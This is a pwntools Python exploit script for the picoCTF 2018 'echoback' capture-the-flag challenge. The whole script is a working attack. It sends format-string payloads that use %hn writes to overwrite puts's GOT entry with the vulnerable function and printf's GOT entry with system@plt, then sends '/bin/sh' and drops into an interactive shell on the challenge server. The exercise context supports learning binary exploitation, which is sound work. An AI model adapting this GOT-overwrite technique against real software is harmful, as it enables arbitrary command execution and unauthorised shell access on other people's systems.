#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('echoback')

host = args.HOST or '2018shell2.picoctf.com'
port = int(args.PORT or 56800)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

context.terminal = ['gnome-terminal', '-e']
gdbscript = '''
break *0x08048604
continue
'''.format(**locals())

# -- Exploit goes here --

"""
puts@got -> vuln # stage 1
printf@got -> system@plt # stage 2
"""

puts_got = 0x0804A01C
printf_got = 0x0804A010
system_plt = 0x08048460
vuln = 0x080485ab
args_offset = 7

def last2bytes(n):
    return n % 0x10000

def first2bytes(n):
    return n / 0x10000

io = start()

# stage 1
payload = "{}%{}x%{}$hn".format(p32(puts_got),
                                last2bytes(vuln) - 4,
                                args_offset)
log.info(payload)
io.sendlineafter(':', payload)

# stage 2
payload = "{}{}%{}x%{}$hn%{}x%{}$hn".format(
            p32(printf_got + 2),
            p32(printf_got),
            first2bytes(system_plt) - 8,
            args_offset,
            last2bytes(system_plt) - first2bytes(system_plt),
            args_offset + 1
        )

io.sendlineafter(':', payload)
io.sendafter(':', '/bin/sh\x00')

io.interactive()

